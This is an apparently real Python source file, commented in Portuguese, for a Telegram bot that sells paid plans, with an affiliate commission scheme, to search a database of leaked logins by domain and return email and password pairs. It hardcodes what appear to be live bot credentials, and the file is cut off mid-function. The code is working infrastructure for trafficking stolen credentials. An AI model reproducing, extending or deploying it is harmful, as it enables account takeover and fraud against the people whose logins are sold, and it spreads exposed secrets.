import os
import uuid
import asyncio
import sqlite3
from datetime import datetime, timedelta
import pytz
from telethon import TelegramClient, events, Button
from telethon.errors.rpcerrorlist import UserIsBlockedError
from telethon.sessions import StringSession
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from urllib.parse import urlparse
import requests
from threading import Thread
from flask import Flask
import time
import hashlib
import re
import shutil
import logging
from typing import Dict, Set, Optional, Tuple, List
from telethon.tl.functions.users import GetFullUserRequest
from telethon.utils import get_display_name

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- 1. CONFIGURAÇÕES ---
try:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", "7369466703:AAHALdZSqvCVkfyhs6sW-JoHkrnX0r9e7Rw") # Usando .get para valor padrão
    API_ID = int(os.environ.get("API_ID", 25317254))
    API_HASH = os.environ.get("API_HASH", "bef2f48bb6b4120c9189ecfd974eb820")
    SAO_PAULO_TZ = pytz.timezone("America/Sao_Paulo")
    DB_FILE = "./database/bot_data.db"
    RESULTS_DIR = "results"
    ADMINS_FILE = "Base/admins.txt"
    COMMISSION_RATE = 0.10
    PLAN_PRICES = {
        30: 27.00,
        60: 47.00,
        90: 67.00,
        36500: 497.00
    }
    MEU_ID = 6919117453 # ID para notificações do main.py
    BANNER_PATH = "/home/container/assets/banner_start.png"
except KeyError as e:
    raise EnvironmentError(f"Missing environment variable: {e}")

client = TelegramClient("bot", API_ID, API_HASH)
client.parse_mode = "html"
scheduler = AsyncIOScheduler(timezone=SAO_PAULO_TZ)
admins_file = ADMINS_FILE
ADMIN_IDS = set()

# Variáveis globais do main.py
usuarios_bloqueados: Set[int] = set()
usuarios_autorizados: Dict[int, str] = {}
mensagens_origem: Dict[int, int] = {}
urls_busca: Dict[int, str] = {}
tasks_canceladas: Dict[str, Dict[str, bool]] = {}



# Criar diretórios necessários do main.py
TEMP_DIR = "./temp_files"
os.makedirs(TEMP_DIR, exist_ok=True)
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(os.path.dirname(DB_FILE), exist_ok=True)
os.makedirs(os.path.dirname(ADMINS_FILE), exist_ok=True)
# --- 2. WEB SERVER (KEEPALIVE) ---
app = Flask(__name__)
@app.route("/")
def home():
    return "I'm alive!"

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- 3. FUNÇÕES DO BANCO DE DADOS ---

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                first_name TEXT,
                username TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS authorizations (
                user_id INTEGER PRIMARY KEY,
                expiry_date TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS blacklist (
                user_id INTEGER PRIMARY KEY
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS tokens (
                token TEXT PRIMARY KEY,
                duration_days INTEGER,
                is_used INTEGER DEFAULT 0,
                used_by INTEGER,
                used_at TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                referred_user_id INTEGER PRIMARY KEY,
                referrer_user_id INTEGER,
                registered_at TEXT,
                has_converted INTEGER DEFAULT 0
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS commissions (
                commission_id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_user_id INTEGER,
                referred_user_id INTEGER,
                token_used TEXT,
                commission_amount REAL,
                earned_at TEXT,
                is_withdrawn INTEGER DEFAULT 0
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS logins (
                domain TEXT,
                login_data TEXT
            )
        """)
        conn.execute("CREATE INDEX IF NOT EXISTS domain_index ON logins (domain)")
        conn.execute("CREATE INDEX IF NOT EXISTS idx_logins_domain_lower ON logins (LOWER(domain))")
        conn.execute("""
            CREATE TABLE IF NOT EXISTS withdrawal_requests (
                request_id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount REAL,
                requested_at TEXT
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS external_apis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                api_url TEXT UNIQUE,
                added_at TEXT,
                is_active INTEGER DEFAULT 1
            )
        """)
        conn.execute("""
            CREATE TABLE IF NOT EXISTS search_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                domain TEXT,
                results_count INTEGER,
                searched_at TEXT
            )
        """)

    if not os.path.exists(RESULTS_DIR): 
        os.makedirs(RESULTS_DIR)

async def log_action(message: str):
    now = datetime.now(SAO_PAULO_TZ).strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"[{now}] {message}\n"
    print(log_message, end='')
    with open("bot.log", "a", encoding="utf-8") as logfile: logfile.write(log_message)
def extract_domain_final(line):
    try:
        line = line.lower()
        parsed_url = urlparse(line)
        if parsed_url.netloc: return parsed_url.netloc
        domain = line.split("@")[1] if "@" in line else line
        domain = domain.split("/")[0]
        return domain
    except: return None

def add_logins_to_db(chunk: list):
    if not chunk:
        return 0

    with sqlite3.connect(DB_FILE) as conn:
        try:
            cur = conn.cursor()
            cur.executemany("INSERT OR IGNORE INTO logins (domain, login_data) VALUES (?, ?)", chunk)
            conn.commit()
            return cur.rowcount
        except Exception as e:
            print(f"Erro ao inserir chunk na DB: {e}")
            return 0

def search_db(domain: str, limit: int = 15000) -> list:
    search_term = domain.lower()
    subdomain_pattern = f"%.{search_term}"

    results = []
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        query = """
            SELECT login_data 
            FROM logins 
            WHERE LOWER(domain) = ? OR LOWER(domain) LIKE ?
            ORDER BY CASE 
                WHEN LOWER(domain) = ? THEN 0 
                WHEN LOWER(domain) LIKE ? THEN 1 
                ELSE 2 
            END
            LIMIT ?
        """
        params = (search_term, subdomain_pattern, search_term, subdomain_pattern, limit)
        cursor.execute(query, params)
        results = [row[0] for row in cursor.fetchall()]
    return results

def get_db_stats():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*), COUNT(DISTINCT domain) FROM logins")
        total_logins, total_domains = cursor.fetchone()
    return total_logins or 0, total_domains or 0

def clear_logins_db():
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("DELETE FROM logins")
        conn.execute("VACUUM")

def generate_token(duration_days: int) -> str:
    token = f"PRO-{uuid.uuid4().hex[:12].upper()}"
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO tokens (token, duration_days) VALUES (?, ?)", (token, duration_days))
    return token

def validate_token(token: str) -> int | None:
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT duration_days FROM tokens WHERE token = ? AND is_used = 0", (token,))
        result = cur.fetchone()
        return result[0] if result else None

def use_token(token: str, user_id: int):
    used_at = datetime.now(SAO_PAULO_TZ).strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("UPDATE tokens SET is_used = 1, used_by = ?, used_at = ? WHERE token = ?", (user_id, used_at, token))

def authorize_user_with_delta(user_id: int, time_delta: timedelta):
    expiry_date = datetime.now(SAO_PAULO_TZ) + time_delta
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT OR REPLACE INTO authorizations (user_id, expiry_date) VALUES (?, ?)", (user_id, expiry_date.isoformat()))
    unban_user(user_id)

def cancel_plan(user_id: int):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("DELETE FROM authorizations WHERE user_id = ?", (user_id,))

def is_authorized(user_id: int) -> bool:
    if user_id in ADMIN_IDS: return True
    if is_banned(user_id): return False
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT expiry_date FROM authorizations WHERE user_id = ?", (user_id,))
        result = cur.fetchone()
        if not result: return False
        try:
            expiry_date = datetime.fromisoformat(result[0])
            if expiry_date > datetime.now(SAO_PAULO_TZ) + timedelta(days=365*90): return True
            return datetime.now(SAO_PAULO_TZ) < expiry_date
        except: return False

def get_user_expiry_date(user_id: int) -> str | None:
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT expiry_date FROM authorizations WHERE user_id = ?", (user_id,))
        result = cur.fetchone()
        if not result: return None
        try:
            expiry_dt = datetime.fromisoformat(result[0])
            if expiry_dt > datetime.now(SAO_PAULO_TZ) + timedelta(days=365*90): return "Vitalício ✨"
            return expiry_dt.strftime("%d/%m/%Y às %H:%M")
        except: return "Data inválida"

def get_admins():
    if not os.path.exists(admins_file):
        with open(admins_file, "w", encoding="utf-8") as f: pass
        return set()
    try:
        with open(admins_file, "r", encoding="utf-8") as f:
            admin_ids = set()
            for line in f:
                line = line.strip()
                if line and line.isdigit():
                    admin_ids.add(int(line))
            return admin_ids
    except Exception as e:
        print(f"Erro ao carregar admins: {e}")
        return set()

def add_user(user_id, first_name, username):
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,))
        if cur.fetchone() is None:
            pass
        cur.execute("INSERT OR REPLACE INTO users (user_id, first_name, username) VALUES (?, ?, ?)", (user_id, first_name, username))

def get_all_users_count():
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(user_id) FROM users")
        return cur.fetchone()[0]

def get_banned_users_count():
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(user_id) FROM blacklist")
        return cur.fetchone()[0]

def ban_user(user_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT OR IGNORE INTO blacklist (user_id) VALUES (?)", (user_id,))

def unban_user(user_id):
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("DELETE FROM blacklist WHERE user_id = ?", (user_id,))

def is_banned(user_id):
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM blacklist WHERE user_id = ?", (user_id,))
        return cur.fetchone() is not None

def register_referral(referred_id: int, referrer_id: int):
    if referred_id == referrer_id: return
    registered_at = datetime.now(SAO_PAULO_TZ).strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT OR IGNORE INTO referrals (referred_user_id, referrer_user_id, registered_at) VALUES (?, ?, ?)", (referred_id, referrer_id, registered_at))

def process_conversion(referred_id: int, token_used: str, duration_days: int):
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT referrer_user_id FROM referrals WHERE referred_user_id = ? AND has_converted = 0", (referred_id,))
        result = cur.fetchone()

        if result:
            referrer_id = result[0]
            plan_price = PLAN_PRICES.get(duration_days, 0)
            commission = plan_price * COMMISSION_RATE

            if commission > 0:
                earned_at = datetime.now(SAO_PAULO_TZ).strftime("%Y-%m-%d %H:%M:%S")
                cur.execute("INSERT INTO commissions (referrer_user_id, referred_user_id, token_used, commission_amount, earned_at) VALUES (?, ?, ?, ?, ?)",
                            (referrer_id, referred_id, token_used, commission, earned_at))
                cur.execute("UPDATE referrals SET has_converted = 1 WHERE referred_user_id = ?", (referred_id,))

                asyncio.run_coroutine_threadsafe(
                    client.send_message(referrer_id, f"🎉 **Você recebeu uma comissão!**\n\nUm de seus indicados ativou um plano e você ganhou **R$ {commission:.2f}**! Use /afiliado para ver seu saldo."),
                    client.loop
                )
        conn.commit()

def get_affiliate_stats(user_id: int) -> dict:
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM referrals WHERE referrer_user_id = ?", (user_id,))
        total_referrals = cur.fetchone()[0]
        cur.execute("SELECT COUNT(*) FROM referrals WHERE referrer_user_id = ? AND has_converted = 1", (user_id,))
        total_conversions = cur.fetchone()[0]
        cur.execute("SELECT SUM(commission_amount) FROM commissions WHERE referrer_user_id = ? AND is_withdrawn = 0", (user_id,))
        current_balance = cur.fetchone()[0] or 0.0
    return {"referrals": total_referrals, "conversions": total_conversions, "earnings": current_balance}

def request_withdrawal(user_id: int, amount: float):
    requested_at = datetime.now(SAO_PAULO_TZ).strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO withdrawal_requests (user_id, amount, requested_at) VALUES (?, ?, ?)", (user_id, amount, requested_at))

def get_unused_tokens():
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT token, duration_days FROM tokens WHERE is_used = 0")
        return cur.fetchall()

def add_search_to_history(user_id: int, domain: str, results_count: int):
    searched_at = datetime.now(SAO_PAULO_TZ).strftime("%Y-%m-%d %H:%M:%S")
    with sqlite3.connect(DB_FILE) as conn:
        conn.execute("INSERT INTO search_history (user_id, domain, results_count, searched_at) VALUES (?, ?, ?, ?)", 
                    (user_id, domain, results_count, searched_at))

def get_user_search_history(user_id: int, limit: int = 10) -> list:
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("""
            SELECT domain, results_count, searched_at 
            FROM search_history 
            WHERE user_id = ? 
            ORDER BY searched_at DESC 
            LIMIT ?
        """, (user_id, limit))
        return cur.fetchall()



# Funções do main.py
def termo_valido(termo: str) -> bool:
    if not termo or not termo.strip():
        return False
    termo = termo.strip()
    if ' ' in termo:
        return False
    padrao_url = re.compile(
        r'^(https?:\/\/)?'
        r'(?:www\.)?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        r'(?:\/[^\s]*)?$',
        re.IGNORECASE
    )
    return bool(padrao_url.match(termo))

try:
    from relatorio_premium import RelatorioPremium
except ImportError:
    class RelatorioPremium:
        def __init__(self, nome: str, user_id: int, data: str, url: str, quantidade: int):
            self.nome = nome
            self.user_id = user_id
            self.data = data
            self.url = url
            self.quantidade = quantidade
            self.imagem = None

        def criar_degradê(self): pass
        def criar_card(self): pass
        def desenhar_conteudo(self): pass
        def desenhar_logo(self): pass
        def gerar_relatorio(self): pass

# Importar a classe LoginSearch do arquivo logins_search.py
try:
    from logins_search import LoginSearch
    print("✅ [INFO] LoginSearch importado com sucesso do arquivo logins_search.py")
except ImportError as e:
    print(f"❌ [ERROR] Erro ao importar LoginSearch: {e}")
    # Fallback: classe simples caso o import falhe
    class LoginSearch:
        def __init__(self, url: str, user_id: int, pasta_temp: str, cancel_flag: Dict, contador_callback=None):
            self.url = url
            self.user_id = user_id
            self.pasta_temp = pasta_temp
            self.cancel_flag = cancel_flag
            self.contador_callback = contador_callback

        def buscar(self):
            # Fallback simples - buscar apenas no banco local
            results = search_db(self.url)
            arquivo_raw = os.path.join(self.pasta_temp, f"{self.user_id}.txt")
            arquivo_formatado = os.path.join(self.pasta_temp, f"{self.user_id}_formatado.txt")

            with open(arquivo_raw, 'w', encoding='utf-8') as f:
                for result in results:
                    f.write(result + '\n')

            with open(arquivo_formatado, 'w', encoding='utf-8') as f:
                for linha in results:
                    if ':' in linha:
                        partes = linha.split(':', 1)
                        email, senha = partes[0].strip(), partes[1].strip()
                        f.write(f"\u2022 EMAIL: {email}\n\u2022 SENHA: {senha}\n\n")

            return arquivo_raw, arquivo_formatado

# --- 5. TAREFAS AGENDADAS ---
async def check_expirations():
    print("⏰ [SCHEDULER] Executando verificação de expiração de planos...")
    now = datetime.now(SAO_PAULO_TZ)
    threshold = now + timedelta(days=3)

    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT user_id, expiry_date FROM authorizations")
        expiring_users = []
        for user_id, expiry_iso in cur.fetchall():
            try:
                expiry_date = datetime.fromisoformat(expiry_iso)
                if expiry_date > datetime.now(SAO_PAULO_TZ) + timedelta(days=365*90): continue
                if now < expiry_date < threshold:
                    days_left = (expiry_date - now).days
                    expiring_users.append((user_id, days_left + 1))
            except: continue

    for user_id, days_left in expiring_users:
        try:
            message = f"⏳ **Alerta de Expiração!**\n\nOlá! Seu plano de acesso expira em aproximadamente **{days_left} dia(s)**.\n\nClique no botão abaixo para falar com o suporte e renovar seu plano!"
            await client.send_message(user_id, message, buttons=[Button.url("✅ Renovar Agora", "https://t.me/Olhosdecristo")])
            await log_action(f"Notificação de expiração enviada para o usuário `{user_id}`.")
        except (UserIsBlockedError, ValueError): pass
        await asyncio.sleep(1)
    print("✅ [SCHEDULER] Verificação de expiração concluída.")

# --- 6. HANDLERS E MENSAGENS ---
async def send_start_message(event_or_user, referral_code=None, admin_view=True):
    """Função auxiliar para enviar a mensagem de start"""
    if hasattr(event_or_user, 'get_sender'):
        user = await event_or_user.get_sender()
        respond_method = event_or_user.respond
        # Para callbacks, usar edit se disponível
        is_callback = hasattr(event_or_user, 'edit') and hasattr(event_or_user, 'data')
    else:
        user = event_or_user
        respond_method = lambda *args, **kwargs: client.send_message(user.id, *args, **kwargs)
        is_callback = False

    add_user(user.id, user.first_name, user.username)

    if referral_code and referral_code.startswith(" ref"):
        try:
            referrer_id = int(referral_code.split("ref")[1])
            if user.id != referrer_id:
                register_referral(user.id, referrer_id)
                await respond_method("✅ Bem-vindo(a)! Sua indicação foi registrada com sucesso.")
        except (ValueError, IndexError): 
            pass

    if is_banned(user.id):
        message = f"🚫 Acesso Bloqueado, {user.first_name}\n\n🆔 Seu ID: {user.id}\n❌ Você foi banido do sistema"
        if is_callback:
            await event_or_user.edit(message)
        else:
            await respond_method(message)
        return

    if user.id in ADMIN_IDS and admin_view:
        admin_buttons = [
            [Button.inline("🔑 Gerar Token", b"gen_token_panel")],
            [Button.inline("📊 Estatísticas", b"stats"), Button.inline("🛡️ Auditoria", b"audit")],
            [Button.inline("📖 Ver Comandos", b"show_admin_commands"), Button.inline("🗑️ Limpar DB", b"clear_db_prompt")],
            [Button.inline("👤 Modo Membro", b"back_to_member_start")]
        ]
        message = f"⚙️ 𝗣𝗮𝗶𝗻𝗲𝗹 𝗱𝗲 𝗔𝗱𝗺𝗶𝗻𝗶𝘀𝘁𝗿𝗮𝗰̧𝗮̃𝗼\n\n👋 Olá, {user.first_name}!\n🆔 Seu ID: {user.id}\n👑 Seu plano: Administrador\n\n📋 Selecione uma opção:"
        if is_callback:
            await event_or_user.edit(message, buttons=admin_buttons)
        else:
            await respond_method(message, buttons=admin_buttons)
    elif is_authorized(user.id):
        expiry_date_str = get_user_expiry_date(user.id)
        member_buttons = [
            [Button.inline("🔍 Nova Busca", b"prompt_search"), Button.inline("📜 Meu Histórico", b"my_history")],
            [Button.inline("💎 Planos para Grupos", b"group_plans"), Button.inline("💼 Painel de Afiliado", b"affiliate_panel")],
            [Button.inline("ℹ️ Detalhes do Acesso", b"my_access"), Button.inline("❓ Ajuda", b"help_member")],
            [Button.url("💬 Suporte", "https://t.me/Tequ1ladoxxado")]
        ]
        message = (
            f"🎉 𝗕𝗲𝗺-𝘃𝗶𝗻𝗱𝗼(𝗮) 𝗱𝗲 𝘃𝗼𝗹𝘁𝗮, {user.first_name}!\n\n"
            f"🆔 Seu ID: {user.id}\n"
            f"📅 Seu plano: Ativo até {expiry_date_str}\n\n"
            "📱 Use os botões abaixo para continuar:"
        )
        if is_callback:
            await event_or_user.edit(message, buttons=member_buttons)
        else:
            await respond_method(message, buttons=member_buttons)
    else:
        new_user_buttons = [
            [Button.url("✅ Adquirir Plano Individual", "https://t.me/Tequ1ladoxxado"), Button.inline("💎 Planos para Grupos", b"group_plans")],
            [Button.inline("🚀 Já tenho um token", b"redeem_token_prompt"), Button.url("💬 Suporte", "https://t.me/Tequ1ladoxxado")]
        ]
        message = (
            f"👋 𝗢𝗹𝗮́, {user.first_name}, 𝗕𝗲𝗺-𝘃𝗶𝗻𝗱𝗼(𝗮) 𝗮𝗼 𝗢𝗹𝗵𝗼𝘀𝗱𝗲𝗰𝗿𝗶𝘀𝘁𝗼_𝗯𝗼𝘁!\n\n"
            "🔎 Somos a plataforma mais rápida para puxadas completas de Logins!\n\n"
            f"✅ 𝗦𝗲𝘂 𝗣𝗲𝗿𝗳𝗶𝗹\n"
            f"🆔 ID: {user.id}\n"
            f"📊 Status: Sem plano ativo\n\n"
            "📢 Adquira um plano para começar a usar!"
        )
        if is_callback:
            await event_or_user.edit(message, buttons=new_user_buttons)
        else:
            await respond_method(message, buttons=new_user_buttons)

@client.on(events.NewMessage(pattern=r'/start(.*)'))
async def start_command(event):
    try:
        referral_code = event.pattern_match.group(1).strip()
        await send_start_message(event, referral_code)
    except Exception as e:
        logger.error(f"Erro no start_command: {e}")
        try:
            await event.respond("❌ Ocorreu um erro. Tente novamente.")
        except:
            pass

@client.on(events.NewMessage(pattern=r'/resgatar (.*)'))
async def resgatar_command(event):
    token = event.pattern_match.group(1).strip()
    user_id = event.sender_id
    duration_days = validate_token(token)
    if duration_days is None:
        await event.respond('😕 𝗧𝗼𝗸𝗲𝗻 𝗶𝗻𝘃𝗮́𝗹𝗶𝗱𝗼 𝗼𝘂 𝗷𝗮́ 𝘂𝘁𝗶𝗹𝗶𝘇𝗮𝗱𝗼')
        return
    authorize_user_with_delta(user_id, timedelta(days=duration_days))
    use_token(token, user_id)
    process_conversion(user_id, token, duration_days)
    plan_name = f"{duration_days} dia(s)"
    if duration_days >= 36500: 
        plan_name = "Vitalício ✨"      
    await event.respond(f'🎉 𝗣𝗮𝗿𝗮𝗯𝗲́𝗻𝘀! Seu acesso de {plan_name} foi ativado com sucesso!')

@client.on(events.NewMessage(pattern=r'/afiliado'))
async def affiliate_command(event):
    if not is_authorized(event.sender_id):
        await event.respond("✋ Você precisa ter um plano ativo para acessar o painel de afiliado.")
        return
    user_id = event.sender_id
    me = await client.get_me()
    affiliate_link = f"https://t.me/{me.username}?start=ref{user_id}"
    stats = get_affiliate_stats(user_id)
    message = (
        f"💼 𝗦𝗲𝘂 𝗣𝗮𝗶𝗻𝗲𝗹 𝗱𝗲 𝗔𝗳𝗶𝗹𝗶𝗮𝗱𝗼\n\n"
        f"🔗 Seu Link de Convite:\n{affiliate_link}\n\n"
        f"📢 Compartilhe este link! Quando alguém iniciar o bot através dele e ativar um plano, você ganha {int(COMMISSION_RATE * 100)}% de comissão.\n\n"
        f"📊 𝗦𝘂𝗮𝘀 𝗘𝘀𝘁𝗮𝘁𝗶́𝘀𝘁𝗶𝗰𝗮𝘀:\n"
        f"  🔄 Conversões: {stats['conversions']}\n"
        f"  💰 Comissões Totais: R$ {stats['earnings']:.2f}\n"
        f"  💸 Disponível para Saque: R$ {stats['earnings']:.2f}\n\n"
    )
    buttons = [
        [Button.inline("💰 Solicitar Saque", b"withdraw_prompt"), Button.inline("🏆 Ver Top Afiliados", b"top_affiliates")],
        [Button.inline("⬅️ Voltar ao Menu", b"back_to_member_start")]
    ]
    await event.respond(message, buttons=buttons)

@client.on(events.NewMessage(pattern=r'/stats'))
async def stats_command(event):
    if event.sender_id not in ADMIN_IDS:
        await event.respond("❌ Comando disponível apenas para administradores.")
        return

    total_users = get_all_users_count()
    banned_users = get_banned_users_count()
    total_logins, total_domains = get_db_stats()

    stats_msg = (
        f"📊 𝗘𝘀𝘁𝗮𝘁𝗶́𝘀𝘁𝗶𝗰𝗮𝘀 𝗱𝗼 𝗕𝗼𝘁\n\n"
        f"👥 𝗨𝘀𝘂𝗮́𝗿𝗶𝗼𝘀:\n"
        f"• Total: {total_users:,}\n"
        f"• Banidos: {banned_users:,}\n"
        f"• Ativos: {total_users - banned_users:,}\n\n"
        f"🗄️ 𝗕𝗮𝗻𝗰𝗼 𝗱𝗲 𝗗𝗮𝗱𝗼𝘀:\n"
        f"• Total de Logins: {total_logins:,}\n"
        f"• Total de Domínios: {total_domains:,}\n\n"
        f"⚙️ 𝗦𝗶𝘀𝘁𝗲𝗺𝗮:\n"
        f"• Administradores: {len(ADMIN_IDS)}\n"
        f"• Status: ✅ Online"
    ).replace(",", ".")

    await event.respond(stats_msg)

@client.on(events.NewMessage(pattern=r'/top_afiliados'))
async def top_affiliates_command(event):
    message = "🏆 𝗥𝗮𝗻𝗸𝗶𝗻𝗴 𝗱𝗲 𝗔𝗳𝗶𝗹𝗶𝗮𝗱𝗼𝘀 - 𝗧𝗼𝗽 𝟭𝟬 🏆\n\n"
    with sqlite3.connect(DB_FILE) as conn:
        cur = conn.cursor()
        cur.execute("SELECT referrer_user_id, SUM(commission_amount) as total FROM commissions WHERE is_withdrawn = 0 GROUP BY referrer_user_id ORDER BY total DESC LIMIT 10")
        top_users = cur.fetchall()
    if not top_users:
        await event.respond("📊 Ainda não há dados suficientes para gerar um ranking.")
        return
    for i, (user_id, total) in enumerate(top_users):
        medal = "🥇" if i == 0 else "🥈" if i == 1 else "🥉" if i == 2 else f"{i+1}º"
        message += f"{medal} - ID: {user_id} - R$ {total:.2f}\n"
    await event.respond(message)

@client.on(events.NewMessage(pattern=r'/dbinfo'))
async def db_info_command(event):
    if event.sender_id not in ADMIN_IDS:
        await event.respond("❌ Comando disponível apenas para administradores.")
        return

    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()

        # Verificar alguns domínios como exemplo
        cursor.execute("SELECT domain, COUNT(*) as count FROM logins GROUP BY domain ORDER BY count DESC LIMIT 10")
        top_domains = cursor.fetchall()

        # Verificar se há dados
        cursor.execute("SELECT COUNT(*) FROM logins")
        total_count = cursor.fetchone()[0]

        # Verificar alguns exemplos de dados
        cursor.execute("SELECT domain, login_data FROM logins LIMIT 5")
        sample_data = cursor.fetchall()

    info_msg = f"🗄️ **Informações Detalhadas do Banco**\n\n"
    info_msg += f"📊 **Total de Registros:** `{total_count:,}`\n\n"

    if top_domains:
        info_msg += f"🏆 **Top 10 Domínios:**\n"
        for domain, count in top_domains:
            info_msg += f"• `{domain}`: {count:,} logins\n"
    else:
        info_msg += "❌ **Nenhum domínio encontrado no banco!**\n"

    if sample_data:
        info_msg += f"\n📝 **Exemplos de Dados:**\n"
        for domain, login_data in sample_data[:3]:
            # Ocultar dados sensíveis mostrando apenas formato
            masked_login = login_data[:20] + "..." if len(login_data) > 20 else login_data
            info_msg += f"• `{domain}`: {masked_login}\n"

    info_msg = info_msg.replace(",", ".")
    await event.respond(info_msg, parse_mode='Markdown')

@client.on(events.NewMessage(pattern=r'^/reset$'))
async def reset_handler(event):
    try:
        sender = await event.get_sender()
        id_user = sender.id
        hash_nome = str(id_user)

        tasks_canceladas.pop(hash_nome, None)
        usuarios_bloqueados.discard(id_user)
        usuarios_autorizados.pop(id_user, None)
        mensagens_origem.pop(id_user, None)
        urls_busca.pop(id_user, None)

        pasta_temp = os.path.join(TEMP_DIR, str(id_user))
        if os.path.exists(pasta_temp):
            shutil.rmtree(pasta_temp, ignore_errors=True)

        await event.reply(
            "✅ 𝗦𝗲𝘂𝘀 𝗱𝗮𝗱𝗼𝘀 𝗳𝗼𝗿𝗮𝗺 𝗿𝗲𝘀𝗲𝘁𝗮𝗱𝗼𝘀!\n\n🔄 Agora você pode utilizar os comandos novamente.\n\n🤖 @Olhosdecristo_bot",
            buttons=[[Button.inline("❌ Apagar Mensagem", data=f"apagarmensagem:{id_user}")]]
        )

    except Exception as e:
        logger.error(f"Erro no reset_handler: {e}")
        await event.reply("❌ Erro ao resetar dados.")

@client.on(events.NewMessage(pattern=r'^/search (.+)$'))
async def search_handler(event):
    try:
        termo = event.pattern_match.group(1)
        sender = await event.get_sender()
        id_user = sender.id

        if not termo_valido(termo):
            return await event.reply(
                "❌ 𝗨𝗥𝗟 𝗶𝗻𝘃𝗮́𝗹𝗶𝗱𝗮 𝗼𝘂 𝗻𝗮̃𝗼 𝗶𝗻𝗳𝗼𝗿𝗺𝗮𝗱𝗮\n\n💡 Exemplo: /search google.com\n\n🤖 @Olhosdecristo_bot",
                buttons=[[Button.inline("❌ Apagar Mensagem", data=f"apagarmensagem:{id_user}")]]
            )

        if id_user in usuarios_bloqueados:
            return await event.reply(
                "⛔ 𝗔𝗴𝘂𝗮𝗿𝗱𝗲 𝗮𝘁𝗲́ 𝗾𝘂𝗲 𝗮 𝗽𝗲𝘀𝗾𝘂𝗶𝘀𝗮 𝘀𝗲𝗷𝗮 𝗳𝗲𝗶𝘁𝗮!\n\n💡 Use o comando /reset para resetar suas informações\n\n🤖 @Olhosdecristo_bot",
                buttons=[[Button.inline("❌ Apagar Mensagem", data=f"apagarmensagem:{id_user}")]]
            )

        url = termo.strip()
        usuarios_bloqueados.add(id_user)

        nome = f"{getattr(sender, 'first_name', '')} {getattr(sender, 'last_name', '')}".strip()
        now = time.strftime("%Y-%m-%d %H:%M:%S")
        hash_nome = str(id_user)

        usuarios_autorizados[id_user] = hash_nome
        mensagens_origem[id_user] = event.id
        urls_busca[id_user] = url
        tasks_canceladas[hash_nome] = {'cancelled': False}

        pasta_temp = os.path.join(TEMP_DIR, str(id_user))
        os.makedirs(pasta_temp, exist_ok=True)

        msg_busca = await client.send_message(
            event.chat_id,
            "☁️ 𝗣𝗿𝗼𝗰𝘂𝗿𝗮𝗻𝗱𝗼 𝗱𝗮𝗱𝗼𝘀 𝗱𝗮 𝗨𝗥𝗟 𝗳𝗼𝗿𝗻𝗲𝗰𝗶𝗱𝗮...\n\n🔍 Logins encontrados: 0\n\n🤖 @Olhosdecristo_bot",
            buttons=[
                [Button.inline("🚫 Parar Pesquisa", data=f"cancelarbusca:{id_user}")],
                [Button.inline("❌ Apagar Mensagem", data=f"apagarmensagem:{id_user}")]
            ],
            reply_to=event.id
        )

        contador_atual = 0
        lock = asyncio.Lock()

        def contador_callback(novo_contador):
            nonlocal contador_atual
            contador_atual = novo_contador

        async def editar_mensagem_periodicamente():
            while not tasks_canceladas[hash_nome]['cancelled']:
                await asyncio.sleep(2)  # Atualizar a cada 2 segundos
                async with lock:
                    try:
